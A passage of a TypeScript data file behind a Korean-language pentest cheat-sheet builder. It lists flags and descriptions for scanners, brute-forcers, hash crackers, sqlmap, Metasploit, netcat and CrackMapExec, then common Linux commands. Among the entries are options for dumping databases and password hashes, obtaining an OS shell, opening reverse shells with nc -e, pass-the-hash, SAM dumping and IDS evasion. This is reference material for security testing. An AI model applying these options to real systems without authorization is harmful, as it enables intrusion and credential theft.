export interface CheatSheetOption {
  id: string
  flag: string
  label: string
  description: string
  needsValue?: boolean
  placeholder?: string
}

export interface CheatSheetTool {
  id: string
  name: string
  base: string
  /** 옵션과 별개로 항상 명령어 끝에 붙는 대상(호스트/URL 등) 입력칸. 지정하지 않으면 표시하지 않는다. */
  targetPlaceholder?: string
  /** 선택된 옵션을 이어붙일 때 쓰는 구분자. 기본은 공백이며, SQL 구문·콘솔 명령처럼 줄 단위 참고용인 도구는 개행을 쓴다. */
  joiner?: string
  note?: string
  options: CheatSheetOption[]
}

export interface CheatSheetCategory {
  id: string
  name: string
  tools: CheatSheetTool[]
}

export const CHEATSHEET_CATEGORIES: CheatSheetCategory[] = [
  {
    id: 'tools',
    name: '펜테스트 도구',
    tools: [
      {
        id: 'nmap', name: 'Nmap', base: 'nmap', targetPlaceholder: '대상 IP 또는 도메인',
        options: [
          { id: 'sV', flag: '-sV', label: '서비스/버전 탐지', description: '열린 포트에서 실행 중인 서비스와 버전 정보를 확인합니다.' },
          { id: 'sC', flag: '-sC', label: '기본 스크립트 실행', description: '대표적인 NSE 스크립트 세트로 기본 정보를 수집합니다.' },
          { id: 'A', flag: '-A', label: '종합 탐지', description: 'OS 탐지·버전 탐지·스크립트 스캔·traceroute를 한 번에 수행합니다.' },
          { id: 'sS', flag: '-sS', label: 'SYN 스텔스 스캔', description: '완전한 TCP 연결 없이 포트 상태를 확인해 상대적으로 은밀합니다.' },
          { id: 'p-', flag: '-p-', label: '전체 포트 스캔', description: '1~65535번 포트를 모두 검사합니다(기본은 상위 1000개만).' },
          { id: 'T4', flag: '-T4', label: '빠른 타이밍 템플릿', description: '스캔 속도를 높이되 과도하게 공격적이지는 않은 수준입니다.' },
          { id: 'top-ports', flag: '--top-ports', label: '상위 포트만 스캔', description: '자주 쓰이는 상위 N개 포트만 빠르게 검사합니다.', needsValue: true, placeholder: '100' },
          { id: 'Pn', flag: '-Pn', label: '호스트 탐색 생략', description: 'ping에 응답하지 않는 대상도 강제로 스캔합니다.' },
          { id: 'sU', flag: '-sU', label: 'UDP 포트 스캔', description: 'DNS·SNMP 등 UDP 기반 서비스를 점검할 때 사용합니다.' },
          { id: 'O', flag: '-O', label: 'OS 탐지', description: '응답 패턴을 분석해 대상의 운영체제를 추정합니다.' },
          { id: 'sn', flag: '-sn', label: '핑 스캔(포트 스캔 생략)', description: '포트는 검사하지 않고 살아있는 호스트만 빠르게 확인합니다.' },
          { id: 'open', flag: '--open', label: '열린 포트만 표시', description: '닫히거나 필터링된 포트는 결과에서 제외합니다.' },
          { id: 'script-vuln', flag: '--script=vuln', label: '취약점 탐지 스크립트', description: '알려진 취약점 패턴을 NSE 스크립트로 점검합니다.' },
          { id: 'oN', flag: '-oN', label: '결과를 텍스트로 저장', description: '스캔 결과를 지정한 파일에 사람이 읽기 쉬운 형식으로 저장합니다.', needsValue: true, placeholder: '파일명' },
          { id: 'oA', flag: '-oA', label: '모든 형식으로 저장', description: '텍스트·XML·grepable 형식을 한 번에 저장합니다.', needsValue: true, placeholder: '파일 접두어' },
          { id: 'f', flag: '-f', label: '패킷 조각화', description: '일부 방화벽·IDS 탐지를 우회하기 위해 패킷을 잘게 나눠 보냅니다.' },
          { id: 'n', flag: '-n', label: 'DNS 조회 생략', description: '이름 해석을 건너뛰어 속도를 높입니다.' },
          { id: 'v', flag: '-v', label: '상세 출력', description: '스캔 진행 상황을 자세히 표시합니다.' },
          { id: 'd', flag: '-d', label: '디버그 출력', description: '스캔 동작을 매우 상세한 디버그 수준으로 표시합니다.' },
        ],
      },
      {
        id: 'nikto', name: 'Nikto', base: 'nikto',
        options: [
          { id: 'h', flag: '-h', label: '대상 지정', description: '점검할 웹 서버의 URL 또는 IP 주소를 지정합니다.', needsValue: true, placeholder: 'URL 또는 IP' },
          { id: 'p', flag: '-p', label: '포트 지정', description: '기본(80/443)이 아닌 다른 포트를 점검할 때 사용합니다.', needsValue: true, placeholder: '포트' },
          { id: 'o', flag: '-o', label: '결과 저장', description: '점검 결과를 파일로 저장합니다.', needsValue: true, placeholder: '파일명' },
          { id: 'Format', flag: '-Format', label: '출력 형식 지정', description: '저장할 결과 파일의 형식을 지정합니다.', needsValue: true, placeholder: 'htm/csv/txt 등' },
          { id: 'Tuning', flag: '-Tuning', label: '테스트 종류 선택', description: '특정 범주의 테스트만 골라서 실행합니다.', needsValue: true, placeholder: '테스트 번호' },
          { id: 'ssl', flag: '-ssl', label: 'SSL 강제 사용', description: '대상을 HTTPS로 강제 접속해 점검합니다.' },
          { id: 'nossl', flag: '-nossl', label: 'SSL 사용 안 함', description: 'HTTPS 여부와 무관하게 SSL 없이 점검합니다.' },
          { id: 'id', flag: '-id', label: '기본 인증 자격증명 지정', description: "'사용자:비밀번호' 형식으로, 기본 인증이 걸린 사이트를 점검합니다.", needsValue: true, placeholder: '사용자:비밀번호' },
          { id: 'vhost', flag: '-vhost', label: '가상 호스트 지정', description: 'Host 헤더를 지정한 값으로 바꿔 점검합니다.', needsValue: true, placeholder: '도메인' },
          { id: 'useproxy', flag: '-useproxy', label: '프록시 사용', description: '지정한 프록시를 통해 점검 트래픽을 전달합니다.', needsValue: true, placeholder: 'http://proxy:포트' },
          { id: 'evasion', flag: '-evasion', label: 'IDS 회피 기법 적용', description: '특정 인코딩 기법으로 탐지 우회를 시도합니다.', needsValue: true, placeholder: '기법 번호' },
          { id: 'mutate', flag: '-mutate', label: '추가 추측 기법 지정', description: '파일·디렉터리·사용자명을 추가로 추측하는 기법을 지정합니다.', needsValue: true, placeholder: '기법 번호' },
          { id: 'timeout', flag: '-timeout', label: '요청 타임아웃 지정', description: '응답을 기다리는 최대 시간을 초 단위로 지정합니다.', needsValue: true, placeholder: '초' },
          { id: 'maxtime', flag: '-maxtime', label: '최대 실행 시간 지정', description: '지정한 시간이 지나면 점검을 중단합니다.', needsValue: true, placeholder: '예: 1h' },
          { id: 'no404', flag: '-no404', label: '404 페이지 자동 감지 끄기', description: '커스텀 404 페이지 때문에 오탐이 발생할 때 사용합니다.' },
          { id: 'nolookup', flag: '-nolookup', label: '역방향 DNS 조회 생략', description: '호스트명 조회 과정을 건너뛰어 속도를 높입니다.' },
          { id: 'nocache', flag: '-nocache', label: '캐시 미사용', description: '이전 점검 결과 캐시를 쓰지 않고 새로 점검합니다.' },
        ],
      },
      {
        id: 'sqlmap', name: 'sqlmap', base: 'sqlmap',
        options: [
          { id: 'u', flag: '-u', label: '대상 URL 지정', description: '파라미터가 포함된 점검 대상 URL을 지정합니다.', needsValue: true, placeholder: 'URL' },
          { id: 'batch', flag: '--batch', label: '자동 진행', description: '확인 질문에 기본값으로 자동 응답해 대화 없이 진행합니다.' },
          { id: 'dbs', flag: '--dbs', label: '데이터베이스 목록 조회', description: '접근 가능한 데이터베이스 이름을 나열합니다.' },
          { id: 'current-db', flag: '--current-db', label: '현재 데이터베이스 확인', description: '연결에 사용 중인 데이터베이스 이름을 확인합니다.' },
          { id: 'current-user', flag: '--current-user', label: '현재 접속 계정 확인', description: '현재 로그인된 데이터베이스 계정을 확인합니다.' },
          { id: 'is-dba', flag: '--is-dba', label: 'DBA 권한 여부 확인', description: '현재 계정이 관리자(DBA) 권한을 가졌는지 확인합니다.' },
          { id: 'tables', flag: '--tables', label: '테이블 목록 조회', description: '지정한 데이터베이스의 테이블을 나열합니다.' },
          { id: 'columns', flag: '--columns', label: '컬럼 목록 조회', description: '지정한 테이블의 컬럼을 나열합니다.' },
          { id: 'dump', flag: '--dump', label: '데이터 덤프', description: '지정한 테이블의 실제 데이터를 추출합니다.' },
          { id: 'data', flag: '--data', label: 'POST 데이터 지정', description: '폼 데이터를 통해 전달되는 파라미터를 점검할 때 사용합니다.', needsValue: true, placeholder: "'id=1&name=a'" },
          { id: 'cookie', flag: '--cookie', label: '쿠키 지정', description: '로그인 세션이 필요한 페이지를 점검할 때 사용합니다.', needsValue: true, placeholder: "'PHPSESSID=...'" },
          { id: 'p', flag: '-p', label: '테스트할 파라미터 지정', description: '여러 파라미터 중 특정 파라미터만 골라 점검합니다.', needsValue: true, placeholder: '파라미터명' },
          { id: 'level', flag: '--level', label: '테스트 강도 설정', description: '값이 높을수록 더 많은 페이로드 조합을 시도합니다.', needsValue: true, placeholder: '1~5' },
          { id: 'risk', flag: '--risk', label: '위험도 설정', description: '값이 높을수록 더 공격적인 페이로드를 시도합니다.', needsValue: true, placeholder: '1~3' },
          { id: 'technique', flag: '--technique', label: '사용할 인젝션 기법 지정', description: 'B(불리언)·T(시간)·U(유니온)·E(에러) 등 시도할 기법을 좁힙니다.', needsValue: true, placeholder: 'BEUST 조합' },
          { id: 'dbms', flag: '--dbms', label: '대상 DBMS 지정', description: '이미 알고 있는 DBMS 종류를 지정해 탐지 속도를 높입니다.', needsValue: true, placeholder: 'MySQL 등' },
          { id: 'threads', flag: '--threads', label: '동시 요청 스레드 수', description: '병렬로 보낼 요청 수를 지정해 속도를 높입니다.', needsValue: true, placeholder: '숫자' },
          { id: 'time-sec', flag: '--time-sec', label: '시간 기반 지연 시간 지정', description: '시간 기반 블라인드 인젝션에서 사용할 지연 시간(초)입니다.', needsValue: true, placeholder: '초' },
          { id: 'tamper', flag: '--tamper', label: 'WAF 우회 스크립트 지정', description: '페이로드를 변형해 필터링 우회를 시도합니다.', needsValue: true, placeholder: 'space2comment 등' },
          { id: 'proxy', flag: '--proxy', label: '프록시 사용', description: '지정한 프록시를 통해 요청을 전송합니다.', needsValue: true, placeholder: 'http://proxy:포트' },
          { id: 'tor', flag: '--tor', label: 'Tor 네트워크 사용', description: 'Tor를 통해 요청을 전송해 발신지를 숨깁니다.' },
          { id: 'users', flag: '--users', label: '전체 사용자 목록 조회', description: '데이터베이스에 등록된 전체 사용자 계정을 나열합니다.' },
          { id: 'passwords', flag: '--passwords', label: '비밀번호 해시 조회', description: '사용자 계정의 비밀번호 해시 값을 조회합니다.' },
          { id: 'privileges', flag: '--privileges', label: '사용자 권한 목록 조회', description: '각 계정에 부여된 권한을 나열합니다.' },
          { id: 'forms', flag: '--forms', label: '폼 자동 탐지', description: '페이지 내 입력 폼을 자동으로 찾아 점검합니다.' },
          { id: 'random-agent', flag: '--random-agent', label: 'User-Agent 무작위화', description: '매 요청마다 다른 브라우저인 것처럼 위장합니다.' },
          { id: 'os-shell', flag: '--os-shell', label: 'OS 셸 획득 시도', description: '인젝션을 통해 운영체제 명령 실행을 시도합니다.' },
        ],
      },
      {
        id: 'hydra', name: 'Hydra', base: 'hydra', targetPlaceholder: '대상 IP 서비스명(ssh, ftp 등)',
        options: [
          { id: 'l', flag: '-l', label: '단일 사용자명', description: '시도할 사용자명 하나를 지정합니다.', needsValue: true, placeholder: '사용자명' },
          { id: 'P', flag: '-P', label: '비밀번호 목록 파일', description: '여러 비밀번호가 담긴 파일을 지정합니다.', needsValue: true, placeholder: '파일 경로' },
          { id: 't', flag: '-t', label: '동시 시도 스레드 수', description: '병렬로 시도할 작업 수를 지정합니다.', needsValue: true, placeholder: '숫자' },
          { id: 'L', flag: '-L', label: '사용자명 목록 파일', description: '여러 사용자명이 담긴 파일을 지정합니다.', needsValue: true, placeholder: '파일 경로' },
          { id: 'f', flag: '-f', label: '첫 성공 시 중단', description: '유효한 계정을 하나 찾으면 즉시 종료합니다.' },
          { id: 'V', flag: '-V', label: '시도 내용 상세 출력', description: '매 시도마다 사용한 계정·비밀번호를 화면에 표시합니다.' },
          { id: 'o', flag: '-o', label: '결과를 파일로 저장', description: '찾아낸 계정·비밀번호를 파일에 기록합니다.', needsValue: true, placeholder: '파일명' },
          { id: 'e', flag: '-e', label: '기본 자격증명 추가 시도', description: "'nsr' 조합(빈 값, 사용자명=비밀번호, 역순)을 추가로 시도합니다.", needsValue: true, placeholder: 'nsr' },
          { id: 'M', flag: '-M', label: '대상 목록 파일 지정', description: '여러 대상을 한 번에 지정해 순차적으로 시도합니다.', needsValue: true, placeholder: '파일 경로' },
          { id: 'C', flag: '-C', label: "'user:pass' 조합 파일 지정", description: '사용자명·비밀번호 쌍이 미리 정해진 목록을 사용합니다.', needsValue: true, placeholder: '파일 경로' },
          { id: 'R', flag: '-R', label: '이전 세션 복원', description: '중단된 시도를 이전 지점부터 이어서 진행합니다.' },
          { id: 'p', flag: '-p', label: '단일 비밀번호', description: '시도할 비밀번호 하나를 지정합니다.', needsValue: true, placeholder: '비밀번호' },
          { id: 's', flag: '-s', label: '포트 지정', description: '기본 포트가 아닐 때 사용합니다.', needsValue: true, placeholder: '포트' },
        ],
      },
      {
        id: 'gobuster', name: 'Gobuster', base: 'gobuster dir',
        note: 'dir(디렉터리·파일 탐색) 모드 기준입니다. gobuster dns, gobuster vhost 등 다른 하위 모드도 있습니다.',
        options: [
          { id: 'u', flag: '-u', label: '대상 URL 지정', description: '디렉터리·파일을 탐색할 대상 URL을 지정합니다.', needsValue: true, placeholder: 'URL' },
          { id: 'w', flag: '-w', label: '워드리스트 지정', description: '시도할 디렉터리·파일 이름 목록입니다.', needsValue: true, placeholder: '워드리스트 경로' },
          { id: 'x', flag: '-x', label: '확인할 확장자 지정', description: '검색에 포함할 파일 확장자를 지정합니다.', needsValue: true, placeholder: 'php,txt 등' },
          { id: 't', flag: '-t', label: '스레드 수 지정', description: '동시 요청 수를 지정합니다.', needsValue: true, placeholder: '숫자' },
          { id: 'k', flag: '-k', label: 'SSL 인증서 검증 생략', description: '자체 서명 인증서를 쓰는 대상에도 접속을 허용합니다.' },
          { id: 'H', flag: '-H', label: '요청 헤더 추가', description: '인증 토큰 등 커스텀 헤더가 필요할 때 사용합니다.', needsValue: true, placeholder: "'Authorization: Bearer ...'" },
          { id: 'c', flag: '-c', label: '쿠키 지정', description: '로그인 세션이 필요한 페이지를 탐색할 때 사용합니다.', needsValue: true, placeholder: '쿠키 값' },
          { id: 'a', flag: '-a', label: 'User-Agent 지정', description: '요청에 사용할 User-Agent 문자열을 지정합니다.', needsValue: true, placeholder: 'User-Agent 값' },
          { id: 'r', flag: '-r', label: '리다이렉트 따라가기', description: '302 등 리다이렉트 응답을 자동으로 따라갑니다.' },
          { id: 'q', flag: '-q', label: '배너 출력 생략', description: '시작 배너 없이 결과만 간결하게 표시합니다.' },
          { id: 'o', flag: '-o', label: '결과 저장', description: '탐색 결과를 파일로 저장합니다.', needsValue: true, placeholder: '파일명' },
        ],
      },
      {
        id: 'ffuf', name: 'ffuf', base: 'ffuf',
        note: 'FUZZ 키워드가 실제로 대입될 위치를 표시합니다(예: URL이나 헤더 값 안에 FUZZ를 넣어 사용).',
        options: [
          { id: 'u', flag: '-u', label: '대상 URL 지정', description: '퍼징 위치를 FUZZ로 표시한 대상 URL을 지정합니다.', needsValue: true, placeholder: 'https://target/FUZZ' },
          { id: 'w', flag: '-w', label: '워드리스트 지정', description: 'FUZZ 자리에 대입할 단어 목록입니다.', needsValue: true, placeholder: '워드리스트 경로' },
          { id: 'mc', flag: '-mc', label: '표시할 응답 코드 지정', description: '결과에 포함할 HTTP 상태 코드를 지정합니다.', needsValue: true, placeholder: '200,301,302' },
          { id: 'fc', flag: '-fc', label: '제외할 응답 코드 지정', description: '결과에서 제외할 HTTP 상태 코드를 지정합니다.', needsValue: true, placeholder: '404' },
          { id: 'fs', flag: '-fs', label: '특정 응답 크기 제외', description: '반복되는 기본 응답을 크기 기준으로 걸러낼 때 사용합니다.', needsValue: true, placeholder: '바이트 수' },
          { id: 't', flag: '-t', label: '동시 요청 수 지정', description: '병렬로 보낼 요청 수를 지정합니다.', needsValue: true, placeholder: '숫자' },
          { id: 'H', flag: '-H', label: '요청 헤더 추가', description: '헤더 값에도 FUZZ를 넣어 헤더 기반 퍼징을 할 수 있습니다.', needsValue: true, placeholder: "'X-Forwarded-For: FUZZ'" },
        ],
      },
      {
        id: 'netcat', name: 'Netcat (nc)', base: 'nc', targetPlaceholder: '호스트 포트',
        options: [
          { id: 'l', flag: '-l', label: '리슨 모드', description: '지정한 포트에서 연결을 대기합니다.' },
          { id: 'v', flag: '-v', label: '상세 출력', description: '연결 상태를 화면에 표시합니다.' },
          { id: 'p', flag: '-p', label: '로컬 포트 지정', description: '리슨 모드에서 사용할 로컬 포트를 지정합니다.', needsValue: true, placeholder: '포트' },
          { id: 'z', flag: '-z', label: '포트 스캔 모드', description: '데이터 전송 없이 연결 가능 여부만 확인합니다.' },
          { id: 'n', flag: '-n', label: 'DNS 조회 생략', description: 'IP만으로 접속해 속도를 높입니다.' },
          { id: 'e', flag: '-e', label: '연결 시 프로그램 실행', description: '리버스·바인드 셸 구성에 사용됩니다.', needsValue: true, placeholder: '프로그램 경로' },
          { id: 'u', flag: '-u', label: 'UDP 모드', description: 'TCP 대신 UDP로 통신합니다.' },
          { id: 'k', flag: '-k', label: '연결 종료 후 재대기', description: '리슨 모드에서 연결이 끊겨도 계속 대기합니다.' },
          { id: 'w', flag: '-w', label: '타임아웃 지정', description: '연결 대기 시간을 초 단위로 지정합니다.', needsValue: true, placeholder: '초' },
          { id: '4', flag: '-4', label: 'IPv4만 사용', description: 'IPv6은 시도하지 않고 IPv4로만 접속합니다.' },
        ],
      },
      {
        id: 'john', name: 'John the Ripper', base: 'john', targetPlaceholder: '해시 파일 경로',
        options: [
          { id: 'wordlist', flag: '--wordlist', label: '사전 파일로 크래킹', description: '지정한 단어 목록을 하나씩 대입해 시도합니다.', needsValue: true, placeholder: '워드리스트 경로' },
          { id: 'rules', flag: '--rules', label: '규칙 기반 변형 적용', description: '사전 단어에 대소문자·특수문자 치환 등 변형을 자동 적용합니다.' },
          { id: 'format', flag: '--format', label: '해시 형식 지정', description: '해시 종류를 명시해 인식 오류를 줄입니다.', needsValue: true, placeholder: 'nt, sha512crypt 등' },
          { id: 'show', flag: '--show', label: '크래킹 결과 표시', description: '지정한 해시 파일에서 이미 찾아낸 비밀번호를 보여줍니다.' },
          { id: 'incremental', flag: '--incremental', label: '무차별 대입 모드', description: '사전 없이 가능한 모든 문자 조합을 순차적으로 시도합니다.' },
          { id: 'session', flag: '--session', label: '세션 이름 지정', description: '중단된 작업을 이어서 진행할 때 사용할 이름을 지정합니다.', needsValue: true, placeholder: '세션명' },
          { id: 'pot', flag: '--pot', label: '결과 저장 파일 지정', description: '크래킹 결과를 저장할 파일 경로를 지정합니다.', needsValue: true, placeholder: '파일 경로' },
        ],
      },
      {
        id: 'hashcat', name: 'Hashcat', base: 'hashcat', targetPlaceholder: '해시 파일 워드리스트',
        options: [
          { id: 'm', flag: '-m', label: '해시 유형 지정', description: '크래킹할 해시의 종류를 번호로 지정합니다.', needsValue: true, placeholder: '0(MD5), 1000(NTLM) 등' },
          { id: 'a', flag: '-a', label: '공격 모드 지정', description: '0(사전 공격), 3(무차별 대입) 등 공격 방식을 지정합니다.', needsValue: true, placeholder: '0 또는 3' },
          { id: 'status', flag: '--status', label: '진행 상황 주기적 출력', description: '크래킹 진행률과 속도를 주기적으로 화면에 표시합니다.' },
          { id: 'o', flag: '-o', label: '결과 저장 파일 지정', description: '크래킹된 결과를 저장할 파일을 지정합니다.', needsValue: true, placeholder: '파일명' },
          { id: 'force', flag: '--force', label: '경고 무시하고 강제 실행', description: 'GPU 드라이버 관련 경고 등을 무시하고 실행합니다.' },
          { id: 'show', flag: '--show', label: '이미 크랙된 결과만 표시', description: '재계산 없이 기존에 찾아낸 비밀번호만 보여줍니다.' },
        ],
      },
      {
        id: 'metasploit', name: 'Metasploit (msfconsole) 콘솔 명령어', base: '', joiner: '\n',
        note: 'msfconsole을 실행한 뒤 콘솔 안에서 입력하는 명령어들입니다.',
        options: [
          { id: 'search', flag: 'search 대상키워드', label: '모듈 검색', description: '이름·CVE 등 키워드로 사용할 익스플로잇/스캐너 모듈을 찾습니다.' },
          { id: 'use', flag: 'use 모듈경로', label: '모듈 선택', description: '검색 결과에서 확인한 모듈 경로를 지정해 불러옵니다.' },
          { id: 'show-options', flag: 'show options', label: '설정 항목 표시', description: '현재 불러온 모듈에 필요한 옵션 목록을 보여줍니다.' },
          { id: 'set', flag: 'set RHOSTS 대상IP', label: '옵션 값 설정', description: '대상, 포트 등 모듈에 필요한 옵션 값을 지정합니다.' },
          { id: 'set-payload', flag: 'set PAYLOAD 페이로드명', label: '페이로드 지정', description: '공격 성공 시 실행할 셸코드·에이전트 종류를 지정합니다.' },
          { id: 'exploit', flag: 'exploit', label: '공격 실행', description: '설정한 모듈과 옵션값으로 실제 공격을 시작합니다.' },
          { id: 'sessions', flag: 'sessions -l', label: '활성 세션 목록 확인', description: '공격에 성공해 열린 세션 목록을 확인합니다.' },
          { id: 'background', flag: 'background', label: '세션 백그라운드 전환', description: '현재 세션을 유지한 채 콘솔로 돌아갑니다.' },
        ],
      },
      {
        id: 'enum4linux', name: 'enum4linux', base: 'enum4linux', targetPlaceholder: '대상 IP',
        options: [
          { id: 'a', flag: '-a', label: '전체 열거 실행', description: '사용자·그룹·공유·정책 등을 한 번에 모두 조회합니다.' },
          { id: 'U', flag: '-U', label: '사용자 목록 조회', description: 'SMB를 통해 사용자 계정 목록을 조회합니다.' },
          { id: 'S', flag: '-S', label: '공유 폴더 목록 조회', description: '공개된 SMB 공유 폴더 목록을 조회합니다.' },
          { id: 'G', flag: '-G', label: '그룹 목록 조회', description: '등록된 그룹 목록을 조회합니다.' },
          { id: 'P', flag: '-P', label: '비밀번호 정책 조회', description: '계정 잠금·비밀번호 정책 설정을 조회합니다.' },
          { id: 'o', flag: '-o', label: 'OS 정보 조회', description: '대상의 운영체제 정보를 조회합니다.' },
        ],
      },
      {
        id: 'wpscan', name: 'WPScan', base: 'wpscan',
        options: [
          { id: 'url', flag: '--url', label: '대상 사이트 지정', description: '점검할 워드프레스 사이트의 URL을 지정합니다.', needsValue: true, placeholder: 'URL' },
          { id: 'enumerate', flag: '--enumerate', label: '열거 항목 지정', description: 'p(플러그인)·t(테마)·u(사용자) 등 조사할 대상을 지정합니다.', needsValue: true, placeholder: 'p,t,u' },
          { id: 'api-token', flag: '--api-token', label: '취약점 DB API 토큰 지정', description: 'WPScan Vulnerability Database 조회에 사용할 토큰을 지정합니다.', needsValue: true, placeholder: 'API 토큰' },
          { id: 'usernames', flag: '--usernames', label: '대입 시도할 사용자명 목록', description: '무차별 대입에 시도할 사용자명 목록 파일을 지정합니다.', needsValue: true, placeholder: '파일 경로' },
          { id: 'passwords', flag: '--passwords', label: '비밀번호 무차별 대입', description: '지정한 비밀번호 목록으로 로그인을 시도합니다.', needsValue: true, placeholder: '파일 경로' },
          { id: 'random-user-agent', flag: '--random-user-agent', label: 'User-Agent 무작위화', description: '매 요청마다 다른 브라우저인 것처럼 위장합니다.' },
        ],
      },
      {
        id: 'crackmapexec', name: 'CrackMapExec / NetExec', base: 'crackmapexec smb', targetPlaceholder: '대상 IP',
        options: [
          { id: 'u', flag: '-u', label: '사용자명 지정', description: '인증에 사용할 사용자명을 지정합니다.', needsValue: true, placeholder: '사용자명' },
          { id: 'p', flag: '-p', label: '비밀번호 지정', description: '인증에 사용할 비밀번호를 지정합니다.', needsValue: true, placeholder: '비밀번호' },
          { id: 'H', flag: '-H', label: 'NTLM 해시로 인증', description: '비밀번호 대신 해시 값으로 인증을 시도합니다(Pass-the-Hash).', needsValue: true, placeholder: 'NTLM 해시' },
          { id: 'shares', flag: '--shares', label: '공유 폴더 목록 조회', description: '접근 가능한 SMB 공유 폴더 목록을 조회합니다.' },
          { id: 'sam', flag: '--sam', label: 'SAM 데이터베이스 덤프 시도', description: '로컬 계정 해시를 추출합니다(관리자 권한 필요).' },
          { id: 'x', flag: '-x', label: '원격 명령 실행 시도', description: '인증에 성공하면 지정한 명령을 원격에서 실행합니다.', needsValue: true, placeholder: '실행할 명령' },
        ],
      },
    ],
  },
  {
    id: 'linux',
    name: 'Linux 명령어',
    tools: [
      {
        id: 'find', name: 'find', base: 'find .',
        options: [
          { id: 'name', flag: '-name', label: '이름으로 검색', description: '지정한 패턴과 일치하는 파일을 찾습니다.', needsValue: true, placeholder: "'*.php'" },
          { id: 'type-f', flag: '-type f', label: '파일만 검색', description: '디렉터리는 제외하고 파일만 찾습니다.' },
          { id: 'type-d', flag: '-type d', label: '디렉터리만 검색', description: '파일은 제외하고 디렉터리만 찾습니다.' },
          { id: 'perm', flag: '-perm', label: '권한으로 검색', description: 'SUID(4000) 등 특정 권한이 설정된 파일을 찾을 때 사용합니다.', needsValue: true, placeholder: '4000' },
          { id: 'exec', flag: '-exec', label: '검색 결과에 명령 실행', description: '찾은 파일마다 지정한 명령을 실행합니다.', needsValue: true, placeholder: "ls -l {} \\;" },
          { id: 'maxdepth', flag: '-maxdepth', label: '검색 깊이 제한', description: '하위 디렉터리를 몇 단계까지 검색할지 지정합니다.', needsValue: true, placeholder: '2' },
          { id: 'user', flag: '-user', label: '소유자로 검색', description: '지정한 사용자가 소유한 파일만 찾습니다.', needsValue: true, placeholder: '사용자명' },
          { id: 'newer', flag: '-newer', label: '특정 파일보다 최근에 수정된 파일 검색', description: '지정한 기준 파일보다 나중에 변경된 파일을 찾습니다.', needsValue: true, placeholder: '기준 파일 경로' },
          { id: 'mtime', flag: '-mtime', label: '수정 시간으로 검색', description: '최근 변경된 파일을 찾을 때 사용합니다.', needsValue: true, placeholder: '-1' },
          { id: 'delete', flag: '-delete', label: '찾은 파일 삭제', description: '조건에 맞는 파일을 바로 삭제합니다 — 되돌릴 수 없으니 주의가 필요합니다.' },
        ],
      },
      {
        id: 'grep', name: 'grep', base: 'grep', targetPlaceholder: "'패턴' 파일",
        options: [
          { id: 'r', flag: '-r', label: '재귀 검색', description: '하위 디렉터리까지 모두 검색합니다.' },
          { id: 'i', flag: '-i', label: '대소문자 무시', description: '대소문자 구분 없이 검색합니다.' },
          { id: 'n', flag: '-n', label: '줄 번호 표시', description: '일치한 줄의 번호를 함께 표시합니다.' },
          { id: 'v', flag: '-v', label: '반전 검색', description: '패턴과 일치하지 않는 줄만 출력합니다.' },
          { id: 'w', flag: '-w', label: '단어 단위로 일치', description: '부분 문자열이 아닌 완전한 단어만 찾습니다.' },
          { id: 'l', flag: '-l', label: '파일명만 출력', description: '일치하는 파일의 이름만 출력합니다.' },
          { id: 'o', flag: '-o', label: '일치한 부분만 출력', description: '줄 전체가 아니라 매칭된 문자열만 보여줍니다.' },
          { id: 'c', flag: '-c', label: '일치하는 줄 개수만 출력', description: '내용 대신 일치한 줄의 개수만 보여줍니다.' },
          { id: 'A', flag: '-A', label: '뒤 N줄 함께 출력', description: '일치한 줄 다음에 오는 줄도 함께 보여줍니다.', needsValue: true, placeholder: '3' },
          { id: 'B', flag: '-B', label: '앞 N줄 함께 출력', description: '일치한 줄 이전에 있는 줄도 함께 보여줍니다.', needsValue: true, placeholder: '3' },
          { id: 'E', flag: '-E', label: '확장 정규식 사용', description: '더 복잡한 정규식 문법을 쓸 수 있습니다.' },
        ],
      },
      {
        id: 'netstat-linux', name: 'netstat', base: 'netstat',
        options: [
          { id: 't', flag: '-t', label: 'TCP 연결 표시', description: 'TCP 연결만 표시합니다.' },
          { id: 'u', flag: '-u', label: 'UDP 연결 표시', description: 'UDP 연결만 표시합니다.' },
          { id: 'l', flag: '-l', label: '리슨 소켓만 표시', description: '연결 대기 중인 소켓만 표시합니다.' },
          { id: 'n', flag: '-n', label: '숫자로 표시', description: '이름 조회 없이 주소·포트를 숫자로 빠르게 표시합니다.' },
          { id: 'p', flag: '-p', label: '프로세스 정보 표시', description: '소켓을 사용 중인 프로세스명·PID를 표시합니다.' },
          { id: 'c', flag: '-c', label: '주기적으로 갱신하며 표시', description: '결과를 한 번만 보여주지 않고 계속 갱신해서 보여줍니다.' },
        ],
      },
      {
        id: 'chmod', name: 'chmod', base: 'chmod', targetPlaceholder: '대상 파일·디렉터리',
        options: [
          { id: 'x', flag: '+x', label: '실행 권한 추가', description: '파일에 실행 권한을 부여합니다.' },
          { id: '755', flag: '755', label: '소유자 전체·나머지 읽기/실행', description: '실행 파일·디렉터리에 흔히 쓰이는 표준 권한입니다.' },
          { id: '644', flag: '644', label: '소유자 읽기/쓰기·나머지 읽기', description: '일반 파일에 흔히 쓰이는 표준 권한입니다.' },
          { id: 'R', flag: '-R', label: '재귀 적용', description: '하위 디렉터리까지 모두 적용합니다.' },
          { id: '777', flag: '777', label: '전체 권한 부여', description: '모든 사용자에게 읽기·쓰기·실행 권한을 부여합니다 — 꼭 필요한 경우가 아니면 피해야 합니다.' },
          { id: 'suid', flag: 'u+s', label: 'SUID 설정', description: '실행 시 소유자 권한으로 동작하게 합니다 — 권한 상승에 악용될 수 있어 주의가 필요합니다.' },
        ],
      },
      {
        id: 'curl', name: 'curl', base: 'curl', targetPlaceholder: 'URL',
        options: [
          { id: 'X', flag: '-X', label: 'HTTP 메서드 지정', description: 'GET·POST 등 요청 방식을 지정합니다.', needsValue: true, placeholder: 'POST' },
          { id: 'H', flag: '-H', label: '요청 헤더 추가', description: '커스텀 헤더를 추가합니다.', needsValue: true, placeholder: "'Content-Type: application/json'" },
          { id: 'd', flag: '-d', label: '요청 본문 데이터 전송', description: 'POST 등의 본문 데이터를 지정합니다.', needsValue: true, placeholder: "'key=value'" },
          { id: 'L', flag: '-L', label: '리다이렉트 따라가기', description: '3xx 응답을 받으면 자동으로 다음 위치를 따라갑니다.' },
          { id: 'I', flag: '-I', label: '응답 헤더만 조회', description: '본문 없이 HEAD 요청으로 헤더만 확인합니다.' },
          { id: 'o', flag: '-o', label: '응답을 파일로 저장', description: '응답 본문을 지정한 파일에 저장합니다.', needsValue: true, placeholder: '파일명' },
          { id: 'u', flag: '-u', label: '기본 인증 자격증명 지정', description: "'사용자:비밀번호' 형식으로 기본 인증을 시도합니다.", needsValue: true, placeholder: '사용자:비밀번호' },
